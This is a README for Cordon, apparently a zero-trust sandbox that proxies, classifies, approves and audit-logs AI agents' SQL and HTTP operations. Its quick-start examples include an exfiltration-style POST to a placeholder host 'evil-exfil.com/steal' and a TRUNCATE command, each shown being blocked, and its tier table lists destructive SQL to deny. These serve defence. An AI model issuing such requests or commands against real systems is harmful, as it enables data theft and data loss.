# Cordon

Zero-trust developer environment. AI agents run in sandboxed workspaces where every operation is intercepted, classified, and audit-logged. Secrets never touch the workspace. Destructive operations require human approval.

## Architecture

```mermaid
graph TD
    Agent["AI Agent<br/>(in workspace)"] -->|SQL query / HTTP request| Proxy["Cordon Proxy Pipeline"]

    subgraph pipeline [Proxy Pipeline]
        Egress["Egress Checker<br/>(allowlist)"]
        Classify["Tier Classifier<br/>(T1-T4)"]
        Approve["Approval Gate<br/>(T3 → human)"]
        Swap["Secret Swap<br/>(placeholder → real)"]
        Audit["Audit Logger<br/>(append-only)"]
    end

    Proxy --> Egress
    Egress -->|blocked| Denied["403 Blocked"]
    Egress -->|allowed| Classify
    Classify -->|T4 forbidden| Denied
    Classify -->|T3 destructive| Approve
    Classify -->|T1-T2 safe| Swap
    Approve -->|denied / timeout| Denied
    Approve -->|approved| Swap
    Swap --> Audit
    Swap --> Target["Target Service"]
    Audit --> DB[("PostgreSQL<br/>(append-only)")]

    Human["Developer<br/>(browser / CLI)"] -->|approve / deny| Approve
    Human -->|view| Dashboard["Web Dashboard"]
    Dashboard --> Audit
```

## Operation Tiers

| Tier | Policy           | Examples                                           |
| ---- | ---------------- | -------------------------------------------------- |
| 1    | Allow + log      | SELECT (with WHERE/LIMIT), HTTP GET, EXPLAIN, SHOW |
| 2    | Allow + log      | INSERT, HTTP POST/PUT/PATCH                        |
| 3    | Require approval | UPDATE, DELETE, DROP TABLE, unbounded SELECT       |
| 4    | Always block     | DROP DATABASE, TRUNCATE, GRANT, REVOKE             |

## Quick Start

```bash
make install-tools                # one-time: install air (Go hot reload) + npm deps
make dev                          # start everything: postgres + Go (hot reload) + Vite (HMR)
```

Opens at http://localhost:5173 (frontend) proxying to http://localhost:8443 (API).

```bash
# Tier 1 — allowed
curl -s -X POST http://localhost:8443/api/proxy/sql \
  -H 'Content-Type: application/json' \
  -d '{"query":"SELECT * FROM users WHERE id = 1","caller":"my-agent"}'

# Tier 4 — blocked
curl -s -X POST http://localhost:8443/api/proxy/sql \
  -H 'Content-Type: application/json' \
  -d '{"query":"TRUNCATE TABLE users","caller":"my-agent"}'

# Egress — denied
curl -s -X POST http://localhost:8443/api/proxy/http \
  -H 'Content-Type: application/json' \
  -d '{"method":"POST","host":"evil-exfil.com","url":"/steal","caller":"agent"}'

# Audit log
curl -s http://localhost:8443/api/audit | jq .
```

## CLI

```bash
go install ./cmd/cordon

cordon status                     # Health check
cordon proxy sql "SELECT 1"       # SQL proxy
cordon proxy http GET github.com  # HTTP proxy
cordon audit show                 # Audit log (table or --json)
cordon workspace create myws      # Create workspace
cordon workspace list             # List workspaces
cordon connect <workspace-id>     # Terminal relay
```

## Project Structure

```
cmd/
  server/              API server entry point
  cordon/              CLI entry point
internal/
  domain/              Pure types (Tier, AuditEntry, Workspace, etc.)
  application/
    ports/             Interfaces (TierClassifier, AuditStore, SecretVault)
    proxy/             Pipeline: classify → egress → swap → audit
    audit/             Audit query service
  infrastructure/
    postgres/          Audit store + testcontainers integration tests
    docker/            Workspace orchestrator (devcontainer CLI)
    sops/              Secret vault (in-memory, SOPS planned)
    websocket/         Approval store with channel-based blocking
    config/            .cordon.yaml parser
  api/
    handlers/          HTTP handlers
    middleware/        Auth + RFC 7807 error handling
    ws/                WebSocket (terminal relay, audit feed, approvals)
web/                   SvelteKit frontend (Svelte 5, Tailwind v4, adapter-static)
archtest/              AST-based architecture constraint tests
e2e/                   End-to-end tests
migrations/            PostgreSQL migrations
docs/                  Spec, acceptance tests, UI audit screenshots
```

Architecture layer dependencies enforced by `archtest/layers_test.go`:

```mermaid
graph LR
    domain --> application
    application --> infrastructure
    infrastructure --> api
    style domain fill:#d4edda,stroke:#28a745
    style application fill:#cce5ff,stroke:#007bff
    style infrastructure fill:#fff3cd,stroke:#ffc107
    style api fill:#f8d7da,stroke:#dc3545
```

Each layer may only depend on layers to its **left**. Violations fail the build.

## Make Targets

```
make dev                Full dev stack (postgres + Go hot reload + Vite HMR)
make dev-db             Start only postgres + run migrations
make dev-server         Go server with hot reload (assumes postgres)
make dev-web            Vite dev server with HMR
make stop               Stop all services

make build              Build Go binaries
make build-web          Build frontend for production
make build-docker       Build Docker image

make test               Unit + arch tests (Go + frontend types)
make test-go            Go tests only
make test-integration   Integration tests (testcontainers)
make test-e2e           Full E2E (spins up docker compose, runs tests, tears down)
make check              Frontend type checking

make clean              Remove build artifacts
make install-tools      Install air + npm deps
make migrate            Run database migrations
```

## Design Decisions

| Decision       | Choice                  | Rationale                                                  |
| -------------- | ----------------------- | ---------------------------------------------------------- |
| DB access (v1) | HTTP-only (`POST /sql`) | Postgres wire protocol can't be intercepted by HTTP proxy  |
| SQL parser     | Keyword-based           | Simple, sufficient for v1, upgradeable to vitess/sqlparser |
| Auth (v1)      | Static tenant ID        | Single-user dev; Ory Kratos integration planned            |
| Approval store | In-memory + channels    | Decisions are ephemeral; persistence not needed for v1     |
| Frontend       | SvelteKit SPA           | adapter-static, Vite proxy to Go backend                   |

## License

MIT
